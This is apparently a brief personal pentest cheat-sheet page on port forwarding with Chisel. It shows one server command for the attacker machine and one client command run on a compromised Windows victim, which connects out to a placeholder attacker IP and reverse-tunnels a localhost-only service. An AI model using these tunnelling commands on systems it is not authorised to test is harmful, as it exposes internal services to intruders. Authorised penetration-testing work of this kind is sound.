+++
title = "Port Forwarding"
author = ["svejk"]
tags = ["pentest", "network"]
draft = false
+++

## Port Forwarding {#port-forwarding}


### Chisel {#chisel}

Compromised windows machine -- service hosted only at 127.0.0.1 -- attacker machine is server and victim machine is client:

```shell { linenos=true, linenostart=1 }
# attacker
chisel server --socks5 --reverse -p 1234
# windows victim
chiselx86_64.exe client <attacker ip>:1234 R:9090:127.0.0.1:9090
```
